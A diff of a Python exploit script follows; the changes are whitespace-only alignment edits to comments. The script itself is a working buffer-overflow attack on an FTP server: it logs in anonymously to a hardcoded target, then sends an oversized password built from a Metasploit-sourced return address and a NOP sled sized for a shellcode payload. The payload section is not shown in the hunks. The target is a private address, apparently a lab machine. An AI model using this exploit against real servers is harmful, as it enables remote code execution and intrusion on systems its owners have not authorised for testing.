@@ -2,8 +2,8 @@ import socket
 import sys
 
 rhost = "192.168.92.132"		# Target RHOST
-rport = int('21')						# Target RPORT
-ftpuser = 'anonymous'				# Login with FTP username. This account MUST exist and permit anonymous login
+rport = int('21')				# Target RPORT
+ftpuser = 'anonymous'			# Login with FTP username. This account MUST exist and permit anonymous login
 
 ret = "\xbb\x14\x40\x00" 	# Return address - Source Metasploit (Little Endian)
 nop = "\x90" * (801-9-351)	# NOP string must be 801-9-$(payload size) below
@@ -48,7 +48,7 @@ client.connect((rhost,rport))                               #Connect to TCP sock
 client.recv(1024)
 client.sendall("USER " + ftpuser + "\r\n")                  #Login with FTP creds
 client.recv(1024)
-client.sendall(password)	                                  # Send buffer overflow
+client.sendall(password)	                                # Send buffer overflow
 client.close()
 
 print("\nDone!")
